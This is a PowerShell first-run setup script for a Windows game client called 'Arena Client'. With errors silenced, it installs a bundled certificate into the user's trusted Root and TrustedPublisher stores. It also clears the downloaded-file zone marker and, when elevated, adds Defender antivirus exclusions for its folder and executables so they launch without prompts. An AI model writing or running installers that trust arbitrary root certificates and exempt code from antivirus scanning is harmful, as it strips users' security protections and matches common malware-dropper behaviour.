# Arena Client — First-time setup (Windows)
# Right-click this file -> "Run with PowerShell" and accept UAC if prompted.
# After setup runs once, you can launch ArenaClient.exe directly.

$ErrorActionPreference = "SilentlyContinue"

$exePath = Join-Path $PSScriptRoot "ArenaClient.exe"
$hudExePath = Join-Path $PSScriptRoot "ArenaClient_HUD.exe"
$cerPath = Join-Path $PSScriptRoot "arena_cert.cer"

if (Test-Path $hudExePath) {
    $exePath = $hudExePath
}

if (-not (Test-Path $exePath)) {
    Write-Host "ERROR: Client EXE not found next to this script." -ForegroundColor Red
    Write-Host "Expected: ArenaClient_HUD.exe (preferred) or ArenaClient.exe" -ForegroundColor Yellow
    Read-Host "Press Enter to exit"
    exit 1
}

Write-Host ""
Write-Host "  Arena Client - Setup" -ForegroundColor Cyan
Write-Host "  --------------------"

if (Test-Path $cerPath) {
    try {
        certutil.exe -user -addstore "Root" $cerPath | Out-Null
        certutil.exe -user -addstore "TrustedPublisher" $cerPath | Out-Null
        Write-Host "  [1/4] Certificate trusted (CurrentUser): OK" -ForegroundColor Green
    } catch {
        Write-Host "  [1/4] Certificate install failed (CurrentUser)." -ForegroundColor Yellow
    }
} else {
    Write-Host "  [1/4] arena_cert.cer not found - skipping cert install." -ForegroundColor Yellow
}

Unblock-File -Path $exePath -ErrorAction SilentlyContinue
if (Test-Path $hudExePath) { Unblock-File -Path $hudExePath -ErrorAction SilentlyContinue }
Write-Host "  [2/4] Zone identifier cleared: OK" -ForegroundColor Green

# SmartScreen / Defender reputation check fires on every new EXE hash. Adding
# the dist folder to Defender exclusions makes future rebuilds launch silently
# (requires Admin). If not elevated we just print a hint.
try {
    $isAdmin = ([Security.Principal.WindowsPrincipal] `
        [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
        [Security.Principal.WindowsBuiltInRole]::Administrator)
    if ($isAdmin) {
        Add-MpPreference -ExclusionPath $PSScriptRoot -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionProcess $exePath -ErrorAction SilentlyContinue
        if (Test-Path $hudExePath) {
            Add-MpPreference -ExclusionProcess $hudExePath -ErrorAction SilentlyContinue
        }
        Write-Host "  [2b/4] Defender exclusion added (no more SmartScreen prompts): OK" -ForegroundColor Green
    } else {
        Write-Host "  [2b/4] Not elevated - SmartScreen prompt may appear on first launch." -ForegroundColor Yellow
        Write-Host "         To silence: right-click setup.ps1 -> 'Run as administrator' once." -ForegroundColor Yellow
    }
} catch {
    Write-Host "  [2b/4] Defender exclusion skipped: $_" -ForegroundColor Yellow
}

try {
    $sig = Get-AuthenticodeSignature -FilePath $exePath
    Write-Host ("  [3/4] Signature status: " + $sig.Status) -ForegroundColor Cyan
    if ($sig.Status -ne "Valid") {
        Write-Host "        WARNING: EXE is not validly signed. Windows may block it." -ForegroundColor Yellow
    }
} catch {
    Write-Host "  [3/4] Signature status: unknown" -ForegroundColor Yellow
}

try {
    $shell = New-Object -ComObject WScript.Shell
    $lnk = $shell.CreateShortcut("$env:USERPROFILE\Desktop\Arena Client.lnk")
    $lnk.TargetPath = $exePath
    $lnk.WorkingDirectory = $PSScriptRoot
    $lnk.IconLocation = $exePath
    $lnk.Save()
    Write-Host "  [4/4] Desktop shortcut created: OK" -ForegroundColor Green
} catch {
    Write-Host "  [4/4] Shortcut skipped: $_" -ForegroundColor Yellow
}

Write-Host ""
Write-Host "  Setup complete. Launching Arena Client..." -ForegroundColor Cyan
Write-Host ""
Start-Process $exePath
